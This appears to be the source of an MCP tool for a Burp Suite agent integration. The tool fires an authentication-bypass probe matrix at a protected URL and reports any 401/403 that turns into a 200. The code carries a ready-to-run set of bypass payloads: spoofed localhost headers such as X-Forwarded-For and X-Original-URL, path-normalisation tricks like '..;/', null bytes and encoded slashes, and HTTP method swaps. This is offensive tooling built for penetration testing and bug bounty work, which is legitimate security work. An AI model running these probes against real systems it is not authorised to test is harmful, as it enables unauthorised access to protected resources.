"""test_login_bypass — one-call orchestrator for auth-bypass probes.

Sends the practical header / path / method bypass payloads against a target
URL and reports which (if any) flip a 401/403 to a 200. Maps to
auth_bypass.json contexts (header_bypass / method_override / path_normalization)
but runs them concretely instead of via auto_probe's parameter-injection
model — these are full-request mutations, not URL parameter fuzz.

Every request routes through Burp (logger_index captured per row).
"""

from __future__ import annotations

import asyncio
from typing import Any
from urllib.parse import urlparse, urlunparse

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools._request_headers import apply_realistic_headers


# Header-injection bypass set. Each entry is (label, dict_of_headers).
# Picked from real bug bounty disclosures + auth_bypass.json + WSTG.
_HEADER_BYPASSES: tuple[tuple[str, dict[str, str]], ...] = (
    ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-For: localhost", {"X-Forwarded-For": "localhost"}),
    ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
    ("X-Originating-IP: 127.0.0.1", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Remote-IP: 127.0.0.1", {"X-Remote-IP": "127.0.0.1"}),
    ("X-Client-IP: 127.0.0.1", {"X-Client-IP": "127.0.0.1"}),
    ("X-Host: localhost", {"X-Host": "localhost"}),
    ("X-Forwarded-Host: localhost", {"X-Forwarded-Host": "localhost"}),
    ("X-Custom-IP-Authorization: 127.0.0.1",
     {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Original-URL: <path>", {"X-Original-URL": "__PATH__"}),
    ("X-Rewrite-URL: <path>", {"X-Rewrite-URL": "__PATH__"}),
    ("X-Override-URL: <path>", {"X-Override-URL": "__PATH__"}),
    ("Referer: <self>", {"Referer": "__SELF__"}),
    ("X-Forwarded-Proto: http", {"X-Forwarded-Proto": "http"}),
    ("X-HTTP-Method-Override: GET", {"X-HTTP-Method-Override": "GET"}),
    ("X-HTTP-Method: GET", {"X-HTTP-Method": "GET"}),
    ("X-Method-Override: GET", {"X-Method-Override": "GET"}),
)


def _path_mutations(path: str) -> list[tuple[str, str]]:
    """Generate path-normalization bypass variants for one path."""
    if not path:
        path = "/"
    base = path.rstrip("/")
    return [
        ("trailing-slash", path + "/"),
        ("trailing-dot", path + "."),
        ("trailing-semicolon", path + ";"),
        ("trailing-encoded-slash", path + "%2f"),
        ("trailing-encoded-dot", path + "%2e"),
        ("dot-slash", path + "/./"),
        ("double-slash", base + "//"),
        ("dot-dot-semicolon", base + "/..;/"),
        ("uppercase-path", path.upper()),
        ("mixed-case-path", "".join(
            (c.upper() if i % 2 == 0 else c.lower())
            for i, c in enumerate(path))),
        ("null-byte", path + "%00"),
        ("null-byte-suffix", path + "%00.json"),
        ("hash-suffix", path + "%23"),
        ("semicolon-path-param", path + ";a=b"),
    ]


def _method_mutations() -> list[str]:
    """HTTP methods that sometimes bypass auth gates on path-or-method routing."""
    return ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]


async def _send(url: str, method: str, headers: dict, body: str = "") -> dict:
    payload: dict = {"method": method, "url": url, "headers": headers,
                     "follow_redirects": False}
    if body:
        payload["body"] = body
    return await client.post("/api/http/curl", json=payload)


def _resolve_header_placeholders(
    raw: dict[str, str], path: str, url: str,
) -> dict[str, str]:
    """Substitute __PATH__ and __SELF__ placeholders with the live values."""
    out: dict[str, str] = {}
    for k, v in raw.items():
        if "__PATH__" in v:
            out[k] = v.replace("__PATH__", path or "/")
        elif "__SELF__" in v:
            out[k] = v.replace("__SELF__", url)
        else:
            out[k] = v
    return out


def _row(label: str, status: int, length: int, idx: int, base_status: int) -> str:
    """Format one result row with a bypass-indicator."""
    delta_marker = ""
    if base_status in (401, 403) and status in (200, 302):
        delta_marker = "  *** BYPASS ***"
    elif base_status in (401, 403) and status not in (401, 403, 404):
        delta_marker = "  [?] DELTA"
    return f"  {label:<42}  {status}  {length:>7}b  #{idx:<5}{delta_marker}"


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_login_bypass(  # cost: medium (~40 requests)
        url: str,
        method: str = "GET",
        cookies: dict | None = None,
        bearer_token: str = "",
        body: str = "",
        skip_methods: bool = False,
        skip_paths: bool = False,
        skip_headers: bool = False,
    ) -> str:
        """Send the auth-bypass probe matrix against one URL.

        Three axes (all parallel through asyncio.gather, all proxied via Burp):
          - headers: X-Forwarded-For / X-Original-URL / X-Rewrite-URL / etc
          - paths:   trailing slash / dot / semicolon / encoded variants /
                     case mutations / null-byte / dot-dot-semicolon
          - methods: POST/PUT/PATCH/DELETE/OPTIONS/HEAD/TRACE swap

        Args:
            url: Protected URL that returns 401/403 unauthenticated
            method: HTTP method for the baseline request (default GET)
            cookies: Optional cookies (test bypass when partially authenticated)
            bearer_token: Optional bearer (same use case)
            body: Optional request body
            skip_methods: Skip the method-swap axis
            skip_paths: Skip the path-normalization axis
            skip_headers: Skip the header-injection axis
        """
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            return f"Error: invalid URL {url!r}"

        path = parsed.path or "/"
        # Baseline — unauthenticated (no cookies/bearer here unless caller passed)
        base_headers = apply_realistic_headers(url, {})
        if cookies:
            base_headers["Cookie"] = "; ".join(
                f"{k}={str(v).replace(';', '%3B')}" for k, v in cookies.items())
        if bearer_token:
            base_headers["Authorization"] = f"Bearer {bearer_token}"

        baseline = await _send(url, method, base_headers, body)
        if "error" in baseline:
            return f"Error (baseline): {baseline['error']}"

        base_status = baseline.get("status_code", 0)
        base_len = baseline.get("response_length", 0)
        base_idx = baseline.get("history_index", -1)

        lines = [
            f"test_login_bypass {method} {url}",
            f"  Baseline: {base_status} ({base_len}b, logger #{base_idx})",
            "",
        ]

        if base_status in (200, 302):
            lines.append("[!] Baseline returned 200/302 — URL is not protected. "
                         "Pick a 401/403 endpoint to make this test meaningful.")
            return "\n".join(lines)

        # ── Header axis ──
        header_tasks: list[asyncio.Task] = []
        header_labels: list[str] = []
        if not skip_headers:
            for label, h in _HEADER_BYPASSES:
                merged = dict(base_headers)
                merged.update(_resolve_header_placeholders(h, path, url))
                header_tasks.append(asyncio.create_task(
                    _send(url, method, merged, body)))
                header_labels.append(label)

        # ── Path axis ──
        path_tasks: list[asyncio.Task] = []
        path_labels: list[str] = []
        if not skip_paths:
            for label, mutated_path in _path_mutations(path):
                mutated_url = urlunparse(parsed._replace(path=mutated_path))
                path_tasks.append(asyncio.create_task(
                    _send(mutated_url, method, base_headers, body)))
                path_labels.append(label)

        # ── Method axis ──
        method_tasks: list[asyncio.Task] = []
        method_labels: list[str] = []
        if not skip_methods:
            for m in _method_mutations():
                if m == method.upper():
                    continue
                method_tasks.append(asyncio.create_task(
                    _send(url, m, base_headers, body)))
                method_labels.append(f"method-swap {m}")

        # Resolve all in parallel, then format per-axis.
        all_results: list[dict[str, Any]] = await asyncio.gather(
            *header_tasks, *path_tasks, *method_tasks, return_exceptions=True,
        )

        bypasses: list[str] = []
        i = 0

        if header_labels:
            lines.append("Headers:")
            for label in header_labels:
                r = all_results[i]
                i += 1
                if isinstance(r, Exception) or "error" in (r if isinstance(r, dict) else {}):
                    lines.append(f"  {label:<42}  ERROR")
                    continue
                s = r.get("status_code", 0)
                ln = r.get("response_length", 0)
                idx = r.get("history_index", -1)
                lines.append(_row(label, s, ln, idx, base_status))
                if base_status in (401, 403) and s in (200, 302):
                    bypasses.append(f"header: {label}")
            lines.append("")

        if path_labels:
            lines.append("Paths:")
            for label in path_labels:
                r = all_results[i]
                i += 1
                if isinstance(r, Exception) or "error" in (r if isinstance(r, dict) else {}):
                    lines.append(f"  {label:<42}  ERROR")
                    continue
                s = r.get("status_code", 0)
                ln = r.get("response_length", 0)
                idx = r.get("history_index", -1)
                lines.append(_row(label, s, ln, idx, base_status))
                if base_status in (401, 403) and s in (200, 302):
                    bypasses.append(f"path: {label}")
            lines.append("")

        if method_labels:
            lines.append("Methods:")
            for label in method_labels:
                r = all_results[i]
                i += 1
                if isinstance(r, Exception) or "error" in (r if isinstance(r, dict) else {}):
                    lines.append(f"  {label:<42}  ERROR")
                    continue
                s = r.get("status_code", 0)
                ln = r.get("response_length", 0)
                idx = r.get("history_index", -1)
                lines.append(_row(label, s, ln, idx, base_status))
                if base_status in (401, 403) and s in (200, 302):
                    bypasses.append(f"method: {label}")
            lines.append("")

        if bypasses:
            lines.append(f"BYPASSES FOUND ({len(bypasses)}):")
            for b in bypasses:
                lines.append(f"  - {b}")
            lines.append("")
            lines.append("Verify each via verify-finding.md before save_finding "
                         "(vuln_type='auth_bypass_403_to_200', severity='high').")
        else:
            lines.append("No bypass detected — auth checks appear consistent across "
                         "header / path / method mutations.")

        return "\n".join(lines)
